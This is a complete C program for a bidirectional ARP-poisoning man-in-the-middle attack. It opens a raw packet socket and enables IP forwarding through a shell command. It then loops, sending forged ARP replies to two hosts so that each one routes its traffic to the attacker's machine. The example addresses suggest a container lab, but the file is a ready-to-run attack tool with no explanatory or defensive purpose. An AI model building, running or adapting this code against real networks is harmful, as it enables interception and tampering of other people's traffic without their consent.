#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <sys/socket.h>
#include <netinet/if_ether.h>
#include <net/if.h>
#include <netpacket/packet.h>
#include <arpa/inet.h>

#include <sys/ioctl.h>

volatile sig_atomic_t keep_running = 1;

void signal_handler(int sig) {
    keep_running = 0;
}

typedef struct {
    int sock;
    struct sockaddr_ll addr;
    uint8_t our_mac[6];
} mitm_ctx_t;

int get_our_mac(const char* interface, uint8_t* mac) {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return -1;
    
    struct ifreq ifr;
    strncpy(ifr.ifr_name, interface, IFNAMSIZ);
    if (ioctl(sock, SIOCGIFHWADDR, &ifr) < 0) {
        close(sock);
        return -1;
    }
    
    memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);
    close(sock);
    return 0;
}

int init_mitm(mitm_ctx_t* ctx, const char* interface) {
    if (get_our_mac(interface, ctx->our_mac) < 0) {
        perror("get_our_mac");
        return -1;
    }
    
    printf("Our MAC: %02x:%02x:%02x:%02x:%02x:%02x\n",
           ctx->our_mac[0], ctx->our_mac[1], ctx->our_mac[2],
           ctx->our_mac[3], ctx->our_mac[4], ctx->our_mac[5]);
    
    ctx->sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if (ctx->sock < 0) {
        perror("socket");
        return -1;
    }
    
    unsigned int ifindex = if_nametoindex(interface);
    if (ifindex == 0) {
        perror("if_nametoindex");
        close(ctx->sock);
        return -1;
    }
    
    memset(&ctx->addr, 0, sizeof(ctx->addr));
    ctx->addr.sll_family = PF_PACKET;
    ctx->addr.sll_protocol = htons(ETH_P_ARP);
    ctx->addr.sll_ifindex = ifindex;
    ctx->addr.sll_hatype = ARPHRD_ETHER;
    ctx->addr.sll_pkttype = PACKET_OUTGOING;
    ctx->addr.sll_halen = 6;
    
    return 0;
}

int send_arp_reply(mitm_ctx_t* ctx, 
                   uint32_t sender_ip, uint8_t* sender_mac,
                   uint32_t target_ip, uint8_t* target_mac) {
    
    struct {
        struct ethhdr eth;
        struct {
            uint16_t htype;
            uint16_t ptype;
            uint8_t hlen;
            uint8_t plen;
            uint16_t oper;
            uint8_t sha[6];
            uint8_t spa[4];
            uint8_t tha[6];
            uint8_t tpa[4];
        } arp;
    } packet;
    
    // Ethernet header
    memcpy(packet.eth.h_dest, target_mac, 6);
    memcpy(packet.eth.h_source, sender_mac, 6);
    packet.eth.h_proto = htons(ETH_P_ARP);
    
    // ARP header
    packet.arp.htype = htons(1);
    packet.arp.ptype = htons(ETH_P_IP);
    packet.arp.hlen = 6;
    packet.arp.plen = 4;
    packet.arp.oper = htons(2); // Reply
    
    memcpy(packet.arp.sha, sender_mac, 6);
    memcpy(packet.arp.spa, &sender_ip, 4);
    memcpy(packet.arp.tha, target_mac, 6);
    memcpy(packet.arp.tpa, &target_ip, 4);
    
    memcpy(ctx->addr.sll_addr, sender_mac, 6);
    
    ssize_t sent = sendto(ctx->sock, &packet, sizeof(packet), 0,
                         (struct sockaddr*)&ctx->addr, sizeof(ctx->addr));
    
    return (sent == sizeof(packet)) ? 0 : -1;
}

void enable_ip_forwarding() {
    system("echo 1 > /proc/sys/net/ipv4/ip_forward");
    printf("IP forwarding enabled\n");
}

// MITM bidirectionnel
void bidirectional_mitm(const char* interface,
                       const char* ip_A_str, const char* mac_A_str,
                       const char* ip_B_str, const char* mac_B_str) {
    
    mitm_ctx_t ctx;
    uint32_t ip_A = inet_addr(ip_A_str);
    uint32_t ip_B = inet_addr(ip_B_str);
    uint8_t mac_A[6], mac_B[6];
    
    sscanf(mac_A_str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &mac_A[0], &mac_A[1], &mac_A[2], &mac_A[3], &mac_A[4], &mac_A[5]);
    sscanf(mac_B_str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &mac_B[0], &mac_B[1], &mac_B[2], &mac_B[3], &mac_B[4], &mac_B[5]);
    
    if (init_mitm(&ctx, interface) < 0) {
        exit(1);
    }
    
    enable_ip_forwarding();
    
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);
    
    printf("\nStarting bidirectional MITM:\n");
    printf("   %s (%s)\n", ip_A_str, mac_A_str);
    printf("        \n");
    printf("   YOU (MITM)\n");
    printf("        \n");
    printf("   %s (%s)\n\n", ip_B_str, mac_B_str);
    
    int count = 0;
    while(keep_running) {
        // Poison A ( B = ctx.our_mac)
        send_arp_reply(&ctx, ip_B, ctx.our_mac, ip_A, mac_A);
        
        // Poison B ( A = ctx.our_mac)
        send_arp_reply(&ctx, ip_A, ctx.our_mac, ip_B, mac_B);
        
        count++;
        printf("\rPoisoning... (sent %d packets)", count * 2);
        fflush(stdout);
        
        sleep(2);
    }
    
    close(ctx.sock);
}

int main(int argc, char* argv[]) {
    if (argc != 6) {
        printf("Usage: %s <interface> <ip_A> <mac_A> <ip_B> <mac_B>\n", argv[0]);
        printf("Example: %s eth0 172.20.0.20 02:42:ac:14:00:14 172.20.0.30 02:42:ac:14:00:1e\n", argv[0]);
        return 1;
    }
    
    if (geteuid() != 0) {
        printf("This program must be run as root\n");
        return 1;
    }
    
    bidirectional_mitm(argv[1], argv[2], argv[3], argv[4], argv[5]);
    
    return 0;
}
